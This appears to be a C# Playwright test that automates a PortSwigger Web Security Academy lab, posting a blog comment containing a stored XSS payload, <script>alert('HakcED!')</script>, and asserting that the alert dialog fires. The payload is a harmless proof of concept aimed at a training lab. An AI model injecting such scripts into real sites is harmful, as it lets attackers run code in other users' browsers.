using Microsoft.Playwright.NUnit;

namespace TestProject1._5._XSS
{
    /// <summary>
    /// Lab: Stored XSS into HTML context with nothing encoded
    /// Url: https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded
    /// </summary>
    internal class StoredXSSTests : PageTest
    {
        private const string YourUniqueLabId = "<your-unique-lab-id>";

        private string target = null;

        [SetUp]
        public void Setup()
        {
            target = $"https://{YourUniqueLabId}.web-security-academy.net/";
        }

        [Test]
        public async Task StoredXSSTest()
        {
            var hasDialogPassed = false;

            await Page.GotoAsync(target);

            // Setup event listener to listen for the dialog we want to trigger!
            Page.Dialog += (_, dialog) =>
            {
                hasDialogPassed = true;
                Assert.That(dialog.Message, Is.EqualTo("HakcED!"));
            };

            // Go to page
            await Page.Locator("xpath=/html/body/div[2]/section/div/section[2]/div[1]/a[2]").ClickAsync();

            // Fill comment information
            await Page.Locator("[name=comment]").FillAsync("<script>alert('HakcED!')</script>");
            await Page.Locator("[name=name]").FillAsync("MaliciousHackerMan");
            await Page.Locator("[name=email]").FillAsync("muhhahah@evilcorp.com");
            await Page.Locator("[name=website]").FillAsync("https://localhost");

            // Submit commit information
            await Page.ClickAsync("xpath=/html/body/div[2]/section/div/div/div/section/form/button");

            await Page.ClickAsync("xpath=/html/body/div[2]/section/div/div/a");

            // The dialog should have popuped if it didn't we need to fail the test
            Assert.That(hasDialogPassed, Is.True);
        }
    }
}
